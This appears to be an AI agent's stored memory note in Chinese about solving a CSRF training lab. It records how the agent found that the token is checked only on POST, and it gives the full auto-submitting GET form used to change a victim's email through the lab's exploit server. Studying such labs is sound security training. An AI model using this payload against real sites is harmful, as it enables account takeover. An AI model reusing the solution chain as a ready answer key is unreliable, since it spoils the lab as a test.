---
metadata:
  node_type: memory
name: "PRS arm A lab-token-validation-depends-on-request-method"
description: "arm A 基线:token 校验仅 POST 生效,GET /my-account/change-email?email= 免 token 改邮箱,GET 表单经 exploit server 交付 victim 即 solved"
last_updated: 2026-10-09T07:34:52+08:00
created: 2026-10-09T07:34:52+08:00
---

## 2026-10-09 arm A 基线

题:`lab-token-validation-depends-on-request-method`(CSRF token 校验依赖请求方法)。
实例冷启(reused:false),`range_launch launch-url` 直接吃 canonical 路径即得实例;自带 exploit server。

### 解法链(一次通过)
1. `http_session get <login>` 取 form(csrf/username/password),POST `/login` wiener:peter 得新 session。
2. `http_session get <base>/my-account/change-email?email=probe-get%40evil.net` 不带 csrf → 302 回
   `/my-account?id=wiener`,页内 `user-email` 变为探针值 ⇒ 校验只在 POST 生效,GET 免 token。
3. exploit server `responseBody` 放自动提交 GET 表单:
   `<form action="<base>/my-account/change-email" method="GET"><input type="hidden" name="email" value="attacker@evil-user.net"></form><script>document.forms[0].submit();</script>`
   `formAction=STORE` 存到 `/exploit`。
4. `formAction=DELIVER_TO_VICTIM` 带 `--follow`(302 `/deliver-to-victim` → `/`),回页横幅 `is-solved`
   + "Congratulations, you solved the lab!"。

### 要点/坑
- 判据用 GET 读 change-email 后回页看 `user-email` 是否变更,比看状态码可靠(成功也回 302→my-account)。
- session cookie `SameSite=None; Secure`,跨站顶层 GET 会带 cookie,故 img/GET 表单可达。
- exploit server 交付后其自身页面就带 lab 横幅;solved 以该横幅为准。
- DELIVER 的 302 链必须 follow,否则受害者未被召来。

